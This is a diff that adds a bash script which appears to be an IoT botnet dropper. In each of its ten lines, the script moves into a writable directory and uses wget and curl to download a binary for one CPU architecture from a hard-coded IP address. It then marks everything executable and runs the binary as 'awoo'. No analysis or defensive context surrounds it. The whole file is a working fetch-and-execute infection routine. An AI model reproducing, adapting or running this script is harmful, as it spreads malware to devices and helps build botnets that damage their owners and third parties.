@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.x86; curl -O http://139.99.125.230/lmaoWTF/loligang.x86;cat loligang.x86 >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.mips; curl -O http://139.99.125.230/lmaoWTF/loligang.mips;cat loligang.mips >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.mpsl; curl -O http://139.99.125.230/lmaoWTF/loligang.mpsl;cat loligang.mpsl >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.arm4; curl -O http://139.99.125.230/lmaoWTF/loligang.arm4;cat loligang.arm4 >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.arm5; curl -O http://139.99.125.230/lmaoWTF/loligang.arm5;cat loligang.arm5 >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.arm6; curl -O http://139.99.125.230/lmaoWTF/loligang.arm6;cat loligang.arm6 >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.arm7; curl -O http://139.99.125.230/lmaoWTF/loligang.arm7;cat loligang.arm7 >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.ppc; curl -O http://139.99.125.230/lmaoWTF/loligang.ppc;cat loligang.ppc >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.m68k; curl -O http://139.99.125.230/lmaoWTF/loligang.m68k;cat loligang.m68k >awoo;chmod +x *;./awoo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.99.125.230/lmaoWTF/loligang.sh4; curl -O http://139.99.125.230/lmaoWTF/loligang.sh4;cat loligang.sh4 >awoo;chmod +x *;./awoo
